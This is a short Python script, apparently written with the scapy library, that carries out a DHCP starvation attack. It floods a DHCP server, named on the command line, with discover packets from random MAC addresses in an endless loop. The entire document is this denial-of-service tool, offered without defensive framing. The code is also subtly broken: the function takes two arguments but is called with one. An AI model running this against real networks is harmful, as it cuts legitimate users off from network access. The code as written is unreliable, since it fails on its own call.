from scapy.all import *
import sys

def dhcp_starvation(dhcp_server, network):
    while True:
        mac = RandMAC()
        
        dhcp_discover = (
            Ether(dst='ff:ff:ff:ff:ff:ff', src=mac) /
            IP(src='0.0.0.0', dst='255.255.255.255') /
            UDP(sport=68, dport=67) /
            BOOTP(op=1, chaddr=mac) /
            DHCP(options=[
                ('message-type', 'discover'),
                ('server_id', dhcp_server),
                ('end')
            ])
        )

        sendp(dhcp_discover, iface=conf.iface, verbose=0)


dhcp_server = sys.argv[1]
network = sys.argv[2]

dhcp_starvation(dhcp_server)